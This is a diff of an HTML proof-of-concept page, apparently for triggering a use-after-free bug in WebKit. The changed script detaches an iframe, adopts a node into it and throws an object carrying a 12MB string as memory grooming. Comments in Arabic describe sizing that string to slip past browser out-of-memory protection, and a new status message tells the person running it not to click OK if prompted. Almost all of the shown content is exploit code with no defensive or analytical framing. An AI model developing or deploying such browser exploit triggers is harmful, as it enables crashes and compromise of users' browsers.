@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h3>WebKit UAF - Stability Optimized</h3>
+    <h3>WebKit UAF - Optimized Trigger</h3>
     <button onclick="main()">Click to trigger the bug</button>
-    <div id="status" style="font-family: monospace; color: #555;">Status: Waiting...</div>
+    <div id="status" style="font-family: monospace; color: #555;">Status: Ready...</div>
 
     <script>
         function main() {
-            document.getElementById('status').innerText = "Status: Triggering...";
+            document.getElementById('status').innerText = "Status: Triggering... (Do not click OK if prompted)";
             
             const f = document.body.appendChild(document.createElement('iframe'));
             const a = document.createElement('div');
@@ -17,17 +17,17 @@
                 document.adoptNode(a);
                 f.remove();
 
-                // بناء السلسلة تدريجياً لتجنب الـ OOM المفاجئ
-                // تقليل الحجم لضمان عدم إطلاق حماية المتصفح (12MB)
-let poison = 'A'.repeat(1024 * 1024 * 3); // 3MB
-for(let i=0; i<2; i++) { poison += poison; } // (3 -> 6 -> 12MB)
+                // التعديل الجراحي: حجز 12 ميجابايت مع تأخير بسيط
+                setTimeout(() => {
+                    let poison = 'A'.repeat(1024 * 1024 * 3); // 3MB
+                    for(let i=0; i<2; i++) { poison += poison; } // زيادة لـ 12MB
 
-
-                throw {
-                    line: 1,
-                    column: 1,
-                    sourceURL: poison
-                };
+                    throw {
+                        line: 1,
+                        column: 1,
+                        sourceURL: poison
+                    };
+                }, 100); 
             })`));
 
             a.addEventListener('a', () => {});
